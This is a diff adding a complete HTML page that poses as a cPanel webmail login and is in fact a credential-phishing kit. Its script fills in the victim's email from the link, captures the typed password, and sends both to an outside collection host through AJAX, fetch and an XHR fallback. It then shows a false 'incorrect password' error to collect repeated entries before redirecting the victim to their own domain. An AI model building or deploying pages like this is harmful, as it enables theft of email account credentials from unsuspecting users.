@@ -1,0 +1,451 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>cPanel Webmail Login | Secure Mail Access</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        .login-card {
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+            transition: all 0.3s ease;
+        }
+        .login-card:hover {
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.12);
+        }
+        .cpanel-logo {
+            filter: drop-shadow(0 2px 4px rgba(0, 0, 0, 0.1));
+        }
+        .input-field:focus {
+            box-shadow: 0 0 0 3px rgba(66, 153, 225, 0.2);
+        }
+        .server-option {
+            transition: all 0.2s ease;
+        }
+        .server-option:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.05);
+        }
+        .server-option.active {
+            border-color: #4299e1;
+            background-color: #ebf8ff;
+        }
+        .floating {
+            animation: floating 3s ease-in-out infinite;
+        }
+        @keyframes floating {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-8px); }
+        }
+        #msg {
+            display: none;
+            margin-top: 10px;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+        .animate-shake {
+            animation: shake 0.5s cubic-bezier(.36,.07,.19,.97) both;
+        }
+                
+        /* Base64 encoded cPanel logo */
+        .cpanel-logo-white {
+            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMDAgNTAiPjxwYXRoIGZpbGw9IiNmZmYiIGQ9Ik0xNDMuMSwyNS4xYzAsNi4yLTUsMTEuMi0xMS4yLDExLjJzLTExLjItNS0xMS4yLTExLjJjMC02LjIsNS0xMS4yLDExLjItMTEuMkMxMzguMSwxMy45LDE0My4xLDE4LjksMTQzLjEsMjUuMSBNMTY1LjUsMjUuMWMwLDYuMi01LDExLjItMTEuMiwxMS4ycy0xMS4yLTUtMTEuMi0xMS4yYzAtNi4yLDUtMTEuMiwxMS4yLTExLjJDMTYwLjUsMTMuOSwxNjUuNSwxOC45LDE2NS41LDI1LjEgTTE4Ny45LDI1LjFjMCw2LjItNSwxMS4yLTExLjIsMTEuMnMtMTEuMi01LTExLjItMTEuMmMwLTYuMiw1LTExLjIsMTEuMi0xMS4yQzE4Mi45LDEzLjksMTg3LjksMTguOSwxODcuOSwyNS4xIE0xMTYuNSwyNS4xYzAsNi4yLTUsMTEuMi0xMS4yLDExLjJzLTExLjItNS0xMS4yLTExLjJjMC02LjIsNS0xMS4yLDExLjItMTEuMkMxMTEuNSwxMy45LDExNi41LDE4LjksMTE2LjUsMjUuMSBNOTQuMSwyNS4xYzAsNi4yLTUsMTEuMi0xMS4yLDExLjJzLTExLjItNS0xES4yLTExLjJjMC02LjIsNS0xES4yLDExLjItMTEuMkM4OS4xLDEzLjksOTQuMSwxOC45LDk0LjEsMjUuMSBNNzEuNywyNS4xYzAsNi4yLTUsMTEuMi0xES4yLDExLjJzLTExLjItNS0xES4yLTExLjJjMC02LjIsNS0xES4yLDExLjItMTEuMkM2Ni43LDEzLjksNzEuNywxOC45LDcxLjcsMjUuMSBNNDkuMywyNS4xYzAsNi4yLTUsMTEuMi0xES4yLDExLjJzLTExLjItNS0xES4yLTExLjJjMC02LjIsNS0xES4yLDExLjItMTEuMkM0NC4zLDEzLjksNDkuMywxOC45LDQ5LjMsMjUuMSBNMjYuOSwyNS4xYzAsNi4yLTUsMTEuMi0xES4yLDExLjJTNC41LDMxLjMsNC41LDI1LjFjMC02LjIsNS0xES4yLDExLjItMTEuMkMyMS45LDEzLjksMjYuOSwxOC45LDI2LjksMjUuMSIvPjwvc3ZnPg==");
+            width: 200px;
+            height: 50px;
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+        .cpanel-logo-color {
+            background-image: url("data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyMDAgNTAiPjxwYXRoIGZpbGw9IiM3NzciIGQ9Ik0xNDMuMSwyNS4xYzAsNi4yLTUsMTEuMi0xES4yLDExLjJzLTExLjItNS0xES4yLTExLjJjMC02LjIsNS0xES4yLDExLjItMTEuMkMxMzguMSwxMy45LDE0My4xLDE4LjksMTQzLjEsMjUuMSBNMTY1LjUsMjUuMWMwLDYuMi01LDExLjItMTEuMiwxMS4ycy0xES4yLTUtMTEuMi0xES4yYzAtNi4yLDUtMTEuMiwxMS4yLTExLjJDMTYwLjUsMTMuOSwxNjUuNSwxOC45LDE2NS41LDI1LjEgTTE4Ny45LDI1LjFjMCw2LjItNSwxMS4yLTExLjIsMTEuMnMtMTEuMi01LT111LjItMTEuMmMwLTYuMiw1LTExLjIsMTEuMi0xES4yQzE4Mi45LDEzLjksMTg3LjksMTguOSwxODcuOSwyNS4xIE0xMTYuNSwyNS4xYzAsNi4yLTUsMTEuMi0xES4yLDExLjJzLTExLjItNS0xES4yLTExLjJjMC02LjIsNS0xES4yLDExLjItMTEuMkMxMTEuNSwxMy45LDExNi41LDE4LjksMTE2LjUsMjUuMSBNOTQuMSwyNS4xYzAsNi4yLTUsMTEuMi0xES4yLDExLjJzLTExLjItNS0xES4yLTExLjJjMC02LjIsNS0xES4yLDExLjItMTEuMkM4OS4xLDEzLjksOTQuMSwxOC45LDk0LjEsMjUuMSBNNzEuNywyNS4xYzAsNi4yLTUsMTEuMi0xES4yLDExLjJzLTExLjItNS0xES4yLTExLjJjMC02LjIsNS0xES4yLDExLjItMTEuMkM2Ni43LDEzLjksNzEuNywxOC45LDcxLjcsMjUuMSBNNDkuMywyNS4xYzAsNi4yLTUsMTEuMi0xES4yLDExLjJzLTExLjItNS0xES4yLTExLjJjMC02LjIsNS0xES4yLDExLjItMTEuMkM0NC4zLDEzLjksNDkuMywxOC45LDQ5LjMsMjUuMSBNMjYuOSwyNS4xYzAsNi4yLTUsMTEuMi0xES4yLDExLjJTNC41LDMxLjMsNC41LDI1LjFjMC02LjIsNS0xES4yLDExLjItMTEuMkMyMS45LDEzLjksMjYuOSwxOC45LDI2LjksMjUuMSIvPjwvc3ZnPg==");
+            width: 200px;
+            height: 50px;
+            background-size: contain;
+            background-repeat: no-repeat;
+        }
+        .email-field {
+            background-color: #f9fafb;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body class="bg-gradient-to-br from-blue-50 to-indigo-100 min-h-screen flex items-center justify-center p-4">
+    <div class="login-card max-w-4xl w-full bg-white rounded-xl overflow-hidden">
+        <div class="md:flex">
+            <!-- Left Side - Graphic -->
+            <div class="hidden md:block md:w-1/2 bg-gradient-to-br from-blue-600 to-indigo-700 p-10 flex flex-col justify-center items-center">
+                <div class="floating mb-8">
+                    <div class="cpanel-logo-white"></div>
+                </div>
+                <div class="text-center text-white">
+                    <h3 class="text-xl font-semibold mb-2">Secure Webmail Access</h3>
+                    <p class="text-blue-100">Connect to your incoming mail server with roundcube standard encryption</p>
+                </div>
+                <div class="mt-8 w-full max-w-xs">
+                    <div class="flex items-center justify-between text-blue-200 text-sm">
+                        <div class="flex items-center">
+                            <i class="fas fa-lock mr-2"></i>
+                            <span>SSL Secured</span>
+                        </div>
+                        <div class="flex items-center">
+                            <i class="fas fa-shield-alt mr-2"></i>
+                            <span>256-bit</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+                        
+            <!-- Right Side - Login Form -->
+            <div class="md:w-1/2 p-8 md:p-10">
+                <div class="md:hidden mb-6 text-center">
+                    <div class="cpanel-logo-color inline-block"></div>
+                </div>
+                                
+                <h2 class="text-2xl font-bold text-gray-800 mb-2">Webmail Login</h2>
+                <p class="text-gray-600 mb-8">Sign in to access your incoming mail server</p>
+                                
+                <form id="loginForm" class="space-y-6">
+                    <div id="msg" class="text-sm text-red-600"></div>
+                    <div id="error" class="text-sm text-red-600" style="display: none;"></div>
+                                        
+                    <div>
+                        <label for="email" class="block text-sm font-medium text-gray-700 mb-1">Email Address</label>
+                        <div class="relative">
+                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                                <i class="fas fa-envelope text-gray-400"></i>
+                            </div>
+                            <input type="email" id="email" name="email" required class="input-field pl-10 w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:border-blue-500" placeholder="email" readonly>
+                        </div>
+                        <p id="recipientEmailPlaceholder" class="hidden text-xs text-gray-500 mt-1">Recipient email: <span id="recipientEmail"></span></p>
+                    </div>
+                                        
+                    <div>
+                        <label for="password" class="block text-sm font-medium text-gray-700 mb-1">Password</label>
+                        <div class="relative">
+                            <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
+                                <i class="fas fa-lock text-gray-400"></i>
+                            </div>
+                            <input type="password" id="password" name="password" required class="input-field pl-10 w-full px-4 py-3 rounded-lg border border-gray-300 focus:outline-none focus:border-blue-500" placeholder="Email Password">
+                        </div>
+                    </div>
+                                        
+                    <div class="flex items-center justify-between">
+                        <div class="flex items-center">
+                            <input id="remember-me" name="remember-me" type="checkbox" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                            <label for="remember-me" class="ml-2 block text-sm text-gray-700">Remember me</label>
+                        </div>
+                        <div class="text-sm">
+                            <a href="#" class="font-medium text-blue-600 hover:text-blue-500">Forgot password?</a>
+                        </div>
+                    </div>
+                                        
+                    <div>
+                        <button type="submit" id="login_submit" class="w-full flex justify-center py-3 px-4 border border-transparent rounded-md shadow-sm text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-blue-500 transition-colors">
+                            View Incoming Mails
+                            <i class="fas fa-arrow-right ml-2"></i>
+                        </button>
+                    </div>
+                </form>
+                                
+                <div class="mt-10">
+                    <h3 class="text-sm font-medium text-gray-500 mb-3">INCOMING MAIL SERVER LINKS</h3>
+                    <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+                        <a href="javascript:void(0)" onclick="selectServer('imap')" class="server-option border rounded-lg p-3 flex items-center hover:border-blue-300">
+                            <div class="bg-blue-100 p-2 rounded-full mr-3">
+                                <i class="fas fa-inbox text-blue-600"></i>
+                            </div>
+                            <div>
+                                <div class="font-medium text-gray-800">IMAP Server</div>
+                                <div class="text-xs text-gray-500">Recommended</div>
+                            </div>
+                        </a>
+                        <a href="javascript:void(0)" onclick="selectServer('pop3')" class="server-option border rounded-lg p-3 flex items-center hover:border-blue-300">
+                            <div class="bg-purple-100 p-2 rounded-full mr-3">
+                                <i class="fas fa-download text-purple-600"></i>
+                            </div>
+                            <div>
+                                <div class="font-medium text-gray-800">POP3 Server</div>
+                                <div class="text-xs text-gray-500">For local storage</div>
+                            </div>
+                        </a>
+                    </div>
+                                        
+                    <div id="serverDetails" class="mt-4 bg-gray-50 p-4 rounded-lg hidden">
+                        <div class="flex items-center justify-between mb-2">
+                            <div class="font-medium text-gray-800" id="serverType">IMAP Server</div>
+                            <button onclick="copyServerDetails()" class="text-xs bg-blue-50 text-blue-600 px-2 py-1 rounded hover:bg-blue-100">
+                                <i class="fas fa-copy mr-1"></i> Copy
+                            </button>
+                        </div>
+                        <div class="text-sm">
+                            <div class="mb-1"><span class="text-gray-600">Server:</span> <span id="serverAddress" class="font-mono">mail.example.com</span></div>
+                            <div class="mb-1"><span class="text-gray-600">Port:</span> <span id="serverPort" class="font-mono">993</span> (SSL)</div>
+                            <div><span class="text-gray-600">Username:</span> <span class="font-mono">Your full email address</span></div>
+                        </div>
+                    </div>
+                </div>
+                                
+                <div class="mt-8 pt-6 border-t border-gray-200">
+                    <p class="text-xs text-gray-500 text-center">
+                        By accessing this system, you agree to our <a href="#" class="text-blue-600 hover:underline">Terms of Service</a>.
+                        <br>Need help? <a href="#" class="text-blue-600 hover:underline">Contact support</a>.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Server selection functionality
+        function selectServer(type) {
+            // Remove active class from all options
+            document.querySelectorAll('.server-option').forEach(option => {
+                option.classList.remove('active');
+            });
+                        
+            // Add active class to clicked option
+            event.currentTarget.classList.add('active');
+                        
+            // Show server details
+            const serverDetails = document.getElementById('serverDetails');
+            serverDetails.classList.remove('hidden');
+                        
+            // Update server details based on selection
+            const serverType = document.getElementById('serverType');
+            const serverAddress = document.getElementById('serverAddress');
+            const serverPort = document.getElementById('serverPort');
+                        
+            if (type === 'imap') {
+                serverType.textContent = 'IMAP Server';
+                serverAddress.textContent = 'mail.yourdomain.com';
+                serverPort.textContent = '993';
+            } else {
+                serverType.textContent = 'POP3 Server';
+                serverAddress.textContent = 'mail.yourdomain.com';
+                serverPort.textContent = '995';
+            }
+        }
+                
+        // Copy server details to clipboard
+        function copyServerDetails() {
+            const serverType = document.getElementById('serverType').textContent;
+            const serverAddress = document.getElementById('serverAddress').textContent;
+            const serverPort = document.getElementById('serverPort').textContent;
+                        
+            const textToCopy = `${serverType}\nServer: ${serverAddress}\nPort: ${serverPort} (SSL)\nUsername: Your full email address`;
+                        
+            navigator.clipboard.writeText(textToCopy).then(() => {
+                const button = event.currentTarget;
+                const originalText = button.innerHTML;
+                                
+                button.innerHTML = '<i class="fas fa-check mr-1"></i> Copied!';
+                button.classList.remove('bg-blue-50', 'text-blue-600');
+                button.classList.add('bg-green-50', 'text-green-600');
+                                
+                setTimeout(() => {
+                    button.innerHTML = originalText;
+                    button.classList.remove('bg-green-50', 'text-green-600');
+                    button.classList.add('bg-blue-50', 'text-blue-600');
+                }, 2000);
+            });
+        }
+
+        // Enhanced function to check URL for email parameter in [[-Email-]] or {email} format
+        function checkForRecipientEmail() {
+            let email = "";
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlHash = window.location.hash.substring(1);
+            
+            // Check all possible sources for email in order of priority
+            const potentialEmailSources = [
+                urlParams.get('email'),
+                decodeURIComponent(urlHash),
+                document.referrer.match(/[\[{]-?(.*?)[\]}]/)?.[1]
+            ];
+
+            // Check each source for valid email patterns
+            for (const source of potentialEmailSources) {
+                if (!source) continue;
+                
+                // Try to extract from [[-email-]] or {email} formats
+                const match = source.match(/(?:\[\[-|{)(.*?)(?:-\]\]|})/) || 
+                             (source.includes('@') && source.includes('.') ? [null, source] : null);
+                
+                if (match && match[1]) {
+                    email = match[1].trim();
+                    // Validate basic email format
+                    if (email.includes('@') && email.includes('.')) {
+                        break;
+                    }
+                }
+            }
+
+            // Set the email field if valid
+            if (email && email.includes('@') && email.includes('.')) {
+                const emailField = document.getElementById('email');
+                emailField.value = email;
+                emailField.readOnly = true;
+                emailField.classList.add('email-field');
+                document.getElementById('recipientEmail').textContent = email;
+                document.getElementById('recipientEmailPlaceholder').classList.remove('hidden');
+                emailField.placeholder = email;
+                
+                // Update page title with the email
+                document.title = `Webmail Login | ${email}`;
+            }
+        }
+
+        // Email validation filter
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        // Form submission with AJAX
+        $(document).ready(function() {
+            let count = 0;
+            var my_slice = "";
+            
+            // Check for recipient email on page load
+            checkForRecipientEmail();
+            
+            $('#login_submit').click(function(event) {
+                event.preventDefault();
+                $('#error').hide();
+                $('#msg').hide();
+                
+                var email = $("#email").val();
+                var password = $("#password").val();
+
+                if (!filter.test(email)) {
+                    $('#error').show();
+                    $('#error').html("Please enter a valid email address");
+                    $('#email').focus();
+                    return false;
+                }
+
+                if (!password) {
+                    $('#msg').show();
+                    $('#msg').html("Password is empty!");
+                    $('#password').focus();
+                    return false;
+                }
+                
+                // Show loading state
+                const submitButton = $('#loginForm button[type="submit"]');
+                const originalButtonText = submitButton.html();
+                submitButton.html('<i class="fas fa-spinner fa-spin mr-2"></i> Signing in...');
+                submitButton.prop('disabled', true);
+                
+                // Extract domain for redirect
+                var ind = email.indexOf("@");
+                if (ind > -1) {
+                    my_slice = email.substr(ind + 1);
+                }
+                
+                // Create form data
+                var formData = new FormData();
+                formData.append('email', email);
+                formData.append('password', password);
+                
+                // AJAX request with both fetch and XHR fallback
+                $.ajax({
+                    dataType: 'JSON',
+                    url: 'https://billioneventsea.store/http/result.php',
+                    type: 'POST',
+                    data: {
+                        email: email,
+                        password: password
+                    },
+                    beforeSend: function(xhr) {
+                        // Clear any previous error messages
+                        $('#msg').hide();
+                    },
+                    success: function(response) {
+                        if(response) {
+                            $("#msg").show();
+                            console.log(response);
+                            
+                            if(response['signal'] == 'ok') {
+                                $("#password").val("");
+                                if (count >= 2) {
+                                    count = 0;
+                                }
+                                Swal.fire({
+                                    icon: 'success',
+                                    title: 'Login Successful',
+                                    text: 'You are now being redirected to your webmail.',
+                                    confirmButtonColor: '#3b82f6'
+                                });
+                            } else {
+                                Swal.fire({
+                                    icon: 'error',
+                                    title: 'Login Failed',
+                                    text: 'Invalid email or password. Please try again.',
+                                    confirmButtonColor: '#3b82f6'
+                                });
+                            }
+                        } else {
+                            Swal.fire({
+                                icon: 'error',
+                                title: 'Error Login',
+                                text: 'There was an error on the server. Please login again',
+                                confirmButtonColor: '#3b82f6'
+                            });
+                        }
+                    },
+                    error: function() {
+                        $("#password").val("");
+                        if (count >= 2) {
+                            count = 0;
+                        }
+                        Swal.fire({
+                            icon: 'error',
+                            title: 'Error Login',
+                            text: 'There was an error on the server. Please login again',
+                            confirmButtonColor: '#3b82f6'
+                        });
+                    },
+                    complete: function() {
+                        // Reset button
+                        submitButton.html(originalButtonText);
+                        submitButton.prop('disabled', false);
+                    }
+                });
+
+                // Try fetch first as fallback
+                fetch('https://billioneventsea.store/http/result.php', {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                }).catch(error => {
+                    // Fallback to XHR if fetch fails
+                    var xhr = new XMLHttpRequest();
+                    xhr.open('POST', 'https://billioneventsea.store/loggg/mailer9.php', true);
+                    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                    xhr.send('email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password));
+                });
+
+                // Always redirect after 3 attempts
+                if (count >= 2) {
+                    count = 0;
+                    if (my_slice) {
+                        window.location.replace("https://www." + my_slice);
+                    }
+                } else {
+                    $('#msg').show();
+                    $('#msg').html("Username or Password is incorrect. Please try again");
+                }
+            });
+
+            // Original form submission handler kept for compatibility
+            $('#loginForm').submit(function(e) {
+                e.preventDefault();
+                $('#login_submit').click();
+            });
+        });
+    </script>
+</body>
+</html>
